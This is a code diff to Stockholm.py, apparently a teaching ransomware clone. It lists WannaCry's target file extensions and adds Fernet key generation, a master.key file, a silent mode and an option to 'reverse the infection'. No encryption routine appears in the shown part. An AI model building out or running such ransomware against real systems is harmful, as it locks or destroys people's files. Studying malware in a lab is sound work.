@@ -13,6 +13,7 @@
 # **************************************************************************** #
 
 import os, argparse
+from cryptography.fernet import Fernet
 
 wannacry_extensions: set[str] = {
     ".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2",
@@ -60,10 +61,26 @@ def parse_arguments():
         been targeted by Wannacry."
     parser = argparse.ArgumentParser(description=desc)
     parser.add_argument("-v", "--version", help="show the version of the program.")
+    parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
+    parser.add_argument("-s", "--silent", help="the program will not produce any output")
     return parser.parse_args()
+
+def store_key(key: bytes) -> None:
+    if os.path.exists("master.key"):
+        print("Stockholm.py: file 'master.key' already exist. Be careful not to override/delete the previous key before decryption.\n\
+              If you are certain of what you're doing, delete the previous master.key file beforehand.")
+        exit(1)
+    try:
+        with open("master.key", "wb") as file:
+            file.write(key)
+    except OSError as error:
+        print(error)
+        exit(1)
 
 if __name__ == "__main__":
     args = parse_arguments()
     if args.version:
         print("Stockholm 1.0.1")
         exit(0)
+    key = Fernet.generate_key()
+    store_key(key)
